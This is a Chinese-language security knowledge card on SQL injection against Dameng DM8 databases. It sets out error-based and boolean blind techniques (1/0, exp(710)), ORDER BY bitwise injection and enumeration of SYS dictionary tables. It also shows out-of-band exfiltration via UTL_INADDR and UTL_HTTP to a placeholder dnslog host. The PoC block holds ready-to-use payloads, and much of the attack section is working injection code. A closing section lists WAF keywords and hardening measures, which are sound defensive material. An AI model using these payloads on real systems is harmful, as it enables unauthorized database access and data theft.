---
id: web-generic-sqli-dameng-dmsql-error-boolean-oob-systables
title: 达梦 DMSQL 注入实战：无 updatexml 时用除零/exp 溢出报错与布尔盲注，靠 SYS 系统表与 UTL_* 带外取数
type: scenario
domain: web
path: web/generic/sqli
technique: dameng-dmsql-error-boolean-oob-systable-enumeration
aliases:
- 达梦注入
- DMSQL 注入
- DM8 SQL 注入
- exp(710) 报错注入
- 达梦布尔盲注
- SYS.SYSOBJECTS 查表
- UTL_INADDR DNS 外带
- 国产数据库注入
tags:
- sqli
- dameng
- dm8
- error-based
- boolean-blind
- oob
- dnslog
- systables
- order-by
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W4
  verified_at: '2026-11-08T20:52:10+08:00'
  notes: '已对照原文核对；本次核对未读取图片；exp(710)/1=1/0 报错布尔、SYS.SYSOBJECTS(TYPE\$/SUBTYPE\$/SCHID)、SYS.SYSCOLUMNS、SYS.ALL_*、V\/V\、WM_CONCAT/LISTAGG、UTL_INADDR/UTL_HTTP 外带、ORDER BY 位运算与 limit 堆叠等 PoC 均逐条取自正文语句；注释符差异（支持 -- 与 /**/，不支持 # 与 /*! */）、&& 可代 AND 而 || 不能代 OR 也与正文一致。未验证点：正文未标注具体达梦版本，故 affected_versions 保持为空（卡片标题中的 DM8 仅据原文引用的达梦 DM8 文档与线上实验室，未作为受影响版本断言）；正文明确时间盲注难用/堆叠靶场失败，卡片已如实标注；未对真实达梦实例发包。'
---

## 一句话结论

达梦（DM8）语法接近 Oracle 但没有 `updatexml`/`extractvalue` 这类直接回显的报错函数，注入时可用「`1/0` 除零」与「`exp(710)` 数值溢出」把布尔条件转成报错差异做布尔盲注，用 `SYS.SYSOBJECTS`/`SYS.SYSCOLUMNS`/`SYS.ALL_*` 与 `V$PARAMETER`、`V$VERSION` 枚举库表列与安装路径，最后用 `UTL_INADDR`/`UTL_HTTP` 把数据拼进域名或 URL 做带外（DNS/HTTP）外带。

## 原理

- **为什么报错能当布尔用**：DM 没有 MySQL 的 XML 类报错函数，但它在**数值运算出错时会抛出可观察的数据库异常**。`1/0` 触发除零，`EXP(710)` 超出 DOUBLE 范围触发溢出，两者只要把条件塞进 `IF(cond, 出错表达式, 安全值)`，True 分支报错、False 分支正常，就得到与布尔盲注等价的二元信号。`EXP` 的溢出阈值固定（710 已溢出、1 不溢出），所以不需要依赖数据内容，稳定可复用。
- **为什么语法细节容易踩坑**：DM 支持 `--` 与 `/* */` 注释，但**不支持 `#` 与 `/*! */` 内联注释**；`&&` 可代替 `AND`，但 `||` 是字符串拼接、**不能代替 `OR`**。这三个差异直接决定了闭合与拼接 payload 的写法，照搬 MySQL 习惯会在语法错误上耗掉大量请求。
- **为什么能枚举元数据**：DM 与 Oracle 一样把字典放在 `SYS` 模式：`SYS.SYSOBJECTS`（`TYPE$='SCH'` 是模式/库，`TYPE$='SCHOBJ' AND SUBTYPE$='UTAB'` 是表，`SCHID` 关联模式 ID）、`SYS.SYSCOLUMNS`（按表 ID 取列名与类型）、`SYS.ALL_USERS`/`SYS.ALL_OBJECTS`/`SYS.ALL_COL_COMMENTS` 是兼容视图。这套结构与 Oracle 高度一致，所以 Oracle 的枚举思路可以直接平移。
- **为什么要 `WM_CONCAT`/`LISTAGG`**：`SELECT banner FROM v$version` 返回多行，在只有单个回显位（或报错/布尔通道）时无法一次带出，用 `WM_CONCAT(banner)`（低版本可用）或 `LISTAGG(banner, ',')`（高版本）把多行压成一行。
- **为什么带外是可靠出口**：`UTL_INADDR.get_host_address('<攻击者可控子域>')` 会触发一次 DNS 解析，`UTL_HTTP.REQUEST('http://<dnslog>?'||(select user))` 会发起 HTTP 请求；数据被拼进域名/URL 即可绕过「无回显、无报错、无时间差」的限制。前提是数据库用户有网络访问权限，且数据拼接后不超长（超长要 `SUBSTR` 分段）。
- **为什么时间盲注不可靠**：`SLEEP(n)` 不能和 `SELECT` 直接组合（语法错误），`dbms_pipe.receive_message` 与 `UTL_HTTP` 的延时在 True/False 两支都会发生，无法形成稳定差分，因此 DM 场景优先报错/布尔，其次带外。
- **order by 的两种注入路径**：`ORDER BY` 后不能直接接 `AND`，可把条件转成**位运算表达式**（`id^(if(cond,1,2))`、`id&(...)`、`id|(...)`）让排序结果随条件变化；或在整条语句被括号包裹且列数一致时用 `(SELECT ... ORDER BY id) union (select 1,2,user)`；或退化成 where 内子查询 `ORDER BY (select 1 from dual where 1=1/(case when cond then 1 else 0 end))`。

## 触发条件

- 后端为达梦 DM8（或兼容 DMSQL 的国产库），存在字符串拼接的 SQL 注入点。
- 报错信息能回显（至少能区分「报错」与「正常」两类响应）；若完全静默，则需数据库用户具备出网能力以走 `UTL_INADDR`/`UTL_HTTP` 带外。
- 盲注时需要能稳定区分布尔差异（响应内容、状态码、行数任意一种）。
- 元数据枚举需当前用户对 `SYS` 字典表有查询权限（普通业务用户通常可查 `SYS.SYSOBJECTS`/`SYS.ALL_*`；`V$PARAMETER` 需更高权限）。

## 利用步骤

1. **指纹确认**：触发异常看是否出现 `dm.jabc.driver.DMException`；`select 1`、`select 1 from dual` 均可执行，`updatexml`/`extractvalue` 不存在 → 判定 DMSQL。
2. **摸清闭合与注释**：用 `'` 与 `\` 试探；确认 `--`、`/**/` 可用、`#` 与 `/*! */` 不可用；`&&` 当 `AND` 用，涉及或逻辑改用 `OR` 关键字而不是 `||`。
3. **确认回显/报错通道**：`union select 1,2,3...` 对齐列数与类型拿回显位；若被过滤或只有报错，改用 `and 1=1/if(<cond>,1,0)` 与 `and 1=exp(if(<cond>,710,1))` 做报错布尔。
4. **取基础信息**：`select user`、`select cur_database`、`SELECT banner FROM v$version`（多行时用 `WM_CONCAT`/`LISTAGG` 压行）、`SELECT NAME,VALUE FROM V$PARAMETER`（拿 `SYSTEM_PATH`/`PORT_NUM`/`TRACE_PATH` 等部署信息，有权限时）。
5. **枚举库→表→列**：`select NAME,ID from SYS.SYSOBJECTS where TYPE$='SCH'` → `... where TYPE$='SCHOBJ' and SUBTYPE$='UTAB' and SCHID=<上一步ID>` → `select NAME,TYPE$,DEFVAL from SYS.SYSCOLUMNS where ID=<表ID>`；或走 `SYS.ALL_USERS` → `SYS.ALL_OBJECTS`（`OBJECT_TYPE='SCH'/'TABLE'`）→ `SYS.ALL_COL_COMMENTS` 的兼容视图路线。
6. **盲注取数据**：逐字符 `if(ascii(substr(<expr>,<pos>,1))=<n>,1,0)` 配合报错或布尔通道；`CASE WHEN`/`DECODE`/`IFNULL`/`NULLIF` 可与 `if()` 互换，用于绕过对 `if(` 的关键字过滤。
7. **order by / limit 场景**：把条件塞进位运算表达式，或退化成 where 子查询；`LIMIT` 位置可尝试堆叠语句（原文靶场失败、实战成功，成功率依赖驱动与配置）。
8. **带外兜底**：`SELECT UTL_INADDR.get_host_address((select user)||'.<dnslog>')` 或 `SELECT UTL_HTTP.REQUEST('http://<dnslog>?'||(select user)) from dual`；数据过长用 `substr` 分段，每次只带 3~8 个字符。

## PoC

```sql
-- 1) 报错通道（除零）
select 1 from dual where 1=1/0;
SELECT * FROM t1 where rownum<5 AND 1=1 AND 1=1/if(len(user)=6,1,0) ORDER BY id DESC;

-- 2) 报错通道（数值溢出，710 必溢出）
select exp(710);
SELECT * FROM t1 where rownum<5 ORDER BY id,exp(if(len(user)=6,711,0)) DESC;

-- 3) 布尔盲注（等价写法，用于换关键字绕过滤）
SELECT * FROM t1 where rownum<5 AND 1=1 AND 1=(case when len(user)=4 then 1 else 0 end) ORDER BY id DESC;
SELECT * FROM t1 where rownum<5 AND 1=1 AND 1=decode(len(user),6,1,0) ORDER BY id DESC;

-- 4) 版本/用户/库名
SELECT WM_CONCAT(banner) FROM v$version;
SELECT LISTAGG(banner, ', ') FROM v$version;
select user; select cur_database;

-- 5) 元数据枚举
select NAME,ID from SYS.SYSOBJECTS where TYPE$='SCH';
select NAME,ID from SYS.SYSOBJECTS where TYPE$='SCHOBJ' and SUBTYPE$='UTAB' and SCHID=150995949;
select NAME,TYPE$,DEFVAL from SYS.SYSCOLUMNS where ID=1078;
select USERNAME from SYS.ALL_USERS;
select OBJECT_NAME from SYS.ALL_OBJECTS where OWNER='SYSDBA' and OBJECT_TYPE='SCH';
select OWNER,TABLE_NAME,COLUMN_NAME from SYS.ALL_COL_COMMENTS where SCHEMA_NAME='OTHER' and TABLE_NAME='t';

-- 6) order by 位置（位运算把条件变成排序差异）
SELECT * FROM t1 where rownum<5 ORDER BY id^(if(len(user)=6,1,2)) DESC;

-- 7) 带外
SELECT UTL_INADDR.get_host_address((select user)||'.<dnslog>');
SELECT UTL_HTTP.REQUEST('http://<dnslog>?'||(select user)) from dual;
```

## 变体与关联

- **变体一**：`if()` 被过滤时换 `CASE WHEN ... THEN ... ELSE ... END`、`DECODE`、`IFNULL`、`NULLIF`；`substr` 被过滤时用 `left`/`right` 配合 `length` 截取。
- **变体二**：`and`/`or` 被过滤时用 `&&`（仅 AND 侧）与位运算/算术优先级改写。
- **变体三**：只有时间可观测时，用 `dbms_pipe.receive_message(('a'),2)` 或 `UTL_HTTP` 指向自己可控的慢速服务制造差分，但稳定性差。
- **关联**：[[web-generic-sqli-db-fingerprint-postgres-dameng-gaussdb]]（只做方言指纹，本卡是其后的取数流程）、[[web-generic-sqli-error-based-extraction]]（报错注入通用方法论）、[[web-generic-sqli-dnslog-oob-exfiltration]]（带外外带通用手法）、[[web-generic-sqli-order-by-union-lexicographic-blind]]（order by 位置盲注）。

## 检测与防御

- **WAF/审计规则**：关注 `exp(710)`、`1/0`、`if(`/`case when` 与 `substr(`, `SYS.SYSOBJECTS`、`SYS.SYSCOLUMNS`、`V$PARAMETER`、`UTL_INADDR`、`UTL_HTTP`、`WM_CONCAT` 等达梦特有字符串组合；同一参数短时间内出现大量 `substr` 递增位置请求属盲注特征。
- **出站管控**：数据库服务器不应具备任意出网能力；对 DM 进程发起的 DNS/HTTP 外联做告警（`UTL_*` 带外的唯一出口）。
- **权限最小化**：业务账号禁止查询 `SYS` 字典与 `V$` 视图、禁止执行 `UTL_*` 包；应用层全部参数化查询，禁止 `ORDER BY`/`LIMIT` 拼接字段名（白名单校验列名与排序方向）。
- **加固**：开启 DM 审计（记录失败语句与敏感字典访问）；对异常 SQL 与返回行数突变建立基线告警。
